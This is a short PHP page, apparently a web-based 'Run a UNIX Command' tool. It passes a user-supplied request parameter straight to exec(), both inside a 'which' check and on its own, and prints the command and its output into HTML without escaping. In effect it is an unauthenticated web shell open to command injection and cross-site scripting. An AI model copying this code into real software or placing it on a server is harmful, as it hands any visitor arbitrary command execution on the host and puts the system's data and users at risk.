<?php
    $data = $_REQUEST["command"];
    $title = "Run a UNIX Command";

    if (strcmp(exec("which $data"), "") == 0)
    {
        $header = "";
        $message = "<p>You entered an invalid command.</p>";
    }
    else 
    {
        $header = "\$ $data";
        exec($data, $output);
        $outputString = join('<br>', $output);
        $message = "<pre><code>$outputString</code></pre>";
    }
?>

<!DOCTYPE html>
<html>
  <head><title><?php echo $title?></title></head>
  <body>
    <h1><?php echo $header?></h1>
    <?php echo $message?>
  </body>
</html>